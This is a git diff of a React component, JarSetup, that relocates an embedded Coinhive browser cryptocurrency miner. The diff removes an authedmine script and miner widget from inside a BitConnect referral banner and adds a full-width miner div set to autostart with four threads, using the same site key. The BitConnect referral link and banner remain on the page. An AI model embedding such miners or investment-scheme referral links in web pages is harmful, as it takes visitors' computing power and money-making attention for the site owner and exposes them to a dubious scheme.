@@ -426,19 +426,13 @@ class JarSetup extends React.Component {
             </tr>
           </tbody>
         </Table>
+        <br/>
         <a href="https://bitconnect.co/?ref=supanat">
           <div style={{
-            'text-align': 'center',
+            'textAlign': 'center',
             'background': 'black'
           }}>
             <Image responsive bsClass='img-responsive center-block' src="https://bitconnect.co/upload/image/banner/lending/BitConnect-lending-728X90.gif"/>
-            <script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
-            <div className="coinhive-miner" style={{
-              "width": "256px",
-              "height": "60px"
-            }} data-key="NiiRozU9BSqWfKNl81wpAS5lwJgbhb1U" data-autostart="true" data-whitelabel="false" data-background="#000000" data-text="#eeeeee" data-action="#00ff00" data-graph="#555555" data-threads="4" data-throttle="0.1">
-              <em>Loading...</em>
-            </div>
           </div>
         </a>
         <br/>
@@ -503,6 +497,10 @@ class JarSetup extends React.Component {
         <Row>
           {nonSelectedJars}
         </Row>
+        <div className="coinhive-miner" style={{
+          "width": "100%",
+          "height": "94px"
+        }} data-key="NiiRozU9BSqWfKNl81wpAS5lwJgbhb1U" data-autostart="true" data-whitelabel="false" data-background="#000000" data-text="#eeeeee" data-action="#00ff00" data-graph="#555555" data-threads="4" data-throttle="0.1"></div>
         <Modal show={this.state.showModal} onHide={this.close.bind(this)}>
           <Modal.Header>
             <Modal.Title>
